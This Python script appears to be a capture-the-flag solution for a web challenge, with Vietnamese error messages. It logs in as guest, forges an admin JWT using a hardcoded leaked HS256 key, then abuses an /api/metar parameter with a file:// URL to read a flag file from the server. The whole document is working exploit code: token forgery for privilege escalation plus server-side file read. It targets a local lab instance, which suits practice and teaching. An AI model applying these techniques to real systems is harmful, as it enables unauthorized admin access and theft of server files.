import re
import requests
import jwt

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.guest_token = None
        self.jwt_key = "FwlxuFDeSeDXDSKsMwWilMTNCqyPwJCzTScahtGBvxAIpNxtqg"
        self.admin_token = None
        self.username = "guest"
        self.password = "guest"
        self.payload = "file:///deploy/flag_[a-z][a-z][a-z][a-z].txt"

    def login(self):
        response = requests.post(
            f"{self.baseURL}/login",
            data={"id": self.username, "pw": self.password},
            timeout=15,
        )
        self.guest_token = response.cookies.get("auth")
        if not self.guest_token:
            raise RuntimeError("Không lấy được cookie auth của guest.")
        print(f"[+] Guest JWT (Cookie): {self.guest_token}\n")

    def decode_jwt_guest(self):
        if not self.guest_token:
            raise RuntimeError("Chưa có guest token.")
        payload = jwt.decode(
            self.guest_token,
            options={"verify_signature": False},
            algorithms=["HS256"]
        )
        print(f"[+] Guest Token Payload:", payload, "\n")
        return payload

    def leak_jwt(self):
        print(f"[+] Leak JWTKEY SuccessFully: {self.jwt_key}\n")
        return self.jwt_key

    def auth_admin(self):
        if not self.jwt_key:
            raise RuntimeError("Chưa có JWTKey để ký.")
        payload = {"id": "admin", "isAdmin": True}
        token = jwt.encode(payload, self.jwt_key, algorithm="HS256")
        if isinstance(token, bytes):
            token = token.decode()
        self.admin_token = token
        print(f"[+] Admin JWT: {self.admin_token}\n")
        return self.admin_token

    def visit_dashboard(self):
        if not self.admin_token:
            raise RuntimeError("Chưa có admin token.")
        cookies = {"auth": self.admin_token}
        response = requests.get(
            f"{self.baseURL}/dashboard",
            cookies=cookies,
            timeout=15
        )
        if "You are not admin." in response.text:
            print("[-] Failed Visit Admin")
            return False
        print("[+] Visit Admin Successfully")
        return True

    def get_flag(self):
        if not self.admin_token:
            raise RuntimeError("Chưa có admin token.")
        response = requests.get(
            f"{self.baseURL}/api/metar",
            params={"airport": self.payload},
            cookies={"auth": self.admin_token},
            timeout=15
        )
        if response.status_code != 200:
            print("[-] Failed request")
            return
        print("[+] Request /api/metar Success")
        flag = re.search(r"(DH\{.*?\})", response.text)
        if flag:
            print(f"[+] Found Flag: {flag.group(1)}")
        else:
            print("[-] Flag not found\nResponse body:\n", response.text)


if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:13000"
    exploit = Exploit(BASE_URL)
    exploit.login()
    exploit.decode_jwt_guest()
    exploit.leak_jwt()
    exploit.auth_admin()
    if exploit.visit_dashboard():
        exploit.get_flag()
